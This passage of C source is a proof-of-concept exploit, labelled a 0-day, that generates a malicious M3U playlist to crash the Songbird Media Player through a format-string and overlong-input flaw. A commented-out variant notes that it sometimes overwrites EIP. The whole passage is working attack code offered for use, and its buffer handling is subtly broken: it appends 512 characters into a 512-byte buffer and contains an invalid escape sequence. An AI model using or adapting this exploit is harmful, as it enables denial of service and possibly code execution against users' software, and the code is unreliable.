===========================
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[])
{

        FILE *Exploit;
        char buffer[512];

        int x;

        printf("\n======================================================================\n");
        printf("0-day Songbird Media Player <= 0.2 Format String Denial Of
Service PoC \n");
        printf("Crashes Songbird Player sometimes consumes 99%% CPU and needs
reboot \n");
        printf("Discovered and Coded By: Greg Linares
<GLinares.code[at]gmail[dot]com>\n");
        printf("Usage: %s <output M3U file>\n", argv[0]);
        printf("====================================================================\n\n\n");


        if (argc < 2) {
                printf("Invalid Number Of Arguments\n");
                return 1;
        }


        Exploit = fopen(argv[1],"w");
   if ( !Exploit )
   {
       printf("\nCouldn't Open File!");
       return 1;
   }

        memset(buffer, 0, 512);

        for (x=0;x<512;x++) {
                strcat(buffer, "A");
        }




   /* I havent played around with much extended ascii but i do know
\xb5 - \xbf work */

        /* Vulgar Fractions Scare Me Too */

        fputs("#EXTM3U\r\n#EXTINF:0,0_day_Songbird_Format_String_PoC_by_Greg_Linares\xbc",
Exploit);
        fputs(buffer, Exploit);
        fputs(buffer, Exploit);
        fputs("\r\nC:\\", Exploit);
        fputs(buffer, Exploit);
        /*
        This works as well here but sometimes EIP doesnt get overwritten and
the application just crashes.

        fputs(".mp3\r\n", Exploit);
        fputs("C:\\RANDOMFILENAMEHERE\xbc\xbx\xbc\xbc", Exploit);
        fputs(buffer, Exploit);
        fputs(".mp3\r\n", Exploit);
        */


        printf("Exploit Succeeded...\n Output File: %s\n\n", argv[1]);


        printf("Questions, Comments, Feedback --> Greg Linares
(GLinares.code[at]gmail[dot]com)\n");

        fclose(Exploit);
        return 0;
}

